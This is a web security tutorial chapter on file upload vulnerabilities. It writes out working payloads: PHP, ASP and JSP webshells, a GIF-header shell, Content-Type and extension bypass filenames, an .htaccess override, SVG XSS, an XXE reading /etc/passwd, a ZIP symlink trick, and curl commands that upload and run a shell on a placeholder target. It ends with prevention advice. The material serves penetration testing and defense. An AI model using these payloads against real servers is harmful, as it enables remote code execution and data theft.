# File Upload Vulnerabilities

File upload functionality is one of the most dangerous features in web applications. Improperly secured file uploads can lead to remote code execution, data breaches, and server compromise.

## Common Vulnerabilities

### Unrestricted File Upload
Allowing any file type to be uploaded without validation.
```bash
# Upload a PHP webshell
POST /upload HTTP/1.1
Content-Type: multipart/form-data
file=<?php system($_GET['cmd']); ?>
```

### Content-Type Bypass
Only checking Content-Type header (client-controlled).
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg        # Changed from text/php
```

### Magic Byte Bypass
Using file signatures to bypass content validation.
```
# GIF header + PHP code
GIF89a<?php system($_GET['cmd']); ?>
```

### Extension Bypass Techniques

| Technique | Example |
|-----------|---------|
| Double extension | `shell.php.jpg`, `shell.php;.jpg` |
| Null byte injection | `shell.php%00.jpg` |
| Case manipulation | `shell.PhP`, `shell.pHp` |
| Reverse extension | `shell.jpg.php` |
| Trailing characters | `shell.php.`, `shell.php ` |
| Unicode/encoding | `shell%2Ephp` |
| Config overrides | `.htaccess`, `web.config` |

### Race Condition (Temporary Upload)
Some applications upload files to a temporary directory before validation.
- Upload + access before deletion
- Tool: `race-the-web`

## Server-Side Attacks

### Webshell Upload
```php
<!-- PHP webshell -->
<?php system($_GET['cmd']); ?>

<!-- ASP webshell -->
<% Execute("cmd.exe /c " & request("cmd")) %>

<!-- JSP webshell -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### .htaccess Overwrite
```apache
# Override configuration to execute .txt files as PHP
AddType application/x-httpd-php .txt
```

### SVG Upload (XSS + SSRF)
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
 "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

### XXE via XML Upload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<doc>&xxe;</doc>
```

### ZIP Symlink
```bash
# Create symlink in ZIP
ln -s /etc/passwd link
zip --symlinks evil.zip link
# Upload + extract = access to /etc/passwd
```

## ImageMagick / Image Processing Attacks
- **ImageTragick** — RCE via malicious image files
- **Decompression bombs** — Tiny image expands to gigabytes
- **Pixel flood** — Excessive image dimensions

## Automated Detection

```bash
# Test upload endpoints with common web shells
# Upload test file, check if accessible
curl -F "file=@shell.php" https://target.com/upload/
curl https://target.com/uploads/shell.php?cmd=id

# Nuclei templates for file upload
nuclei -t ~/nuclei-templates/vulnerabilities/generic/file-upload/
```

## Prevention

1. **Allow-list file extensions** — Reject everything else
2. **Validate content-type server-side** — Not from user input
3. **Scan file content** — Use ClamAV or similar
4. **Store files outside webroot** — Use secure storage (S3 with signed URLs)
5. **Rename files on upload** — Use UUID-based filenames
6. **Disable execution** in upload directories (noexec mount, .htaccess deny)
7. **Limit file size** — Prevent DoS via large uploads
8. **Check image dimensions** — Prevent decompression bombs

---

> **Next**: [Server-Side Template Injection (SSTI)](11-ssti.md)
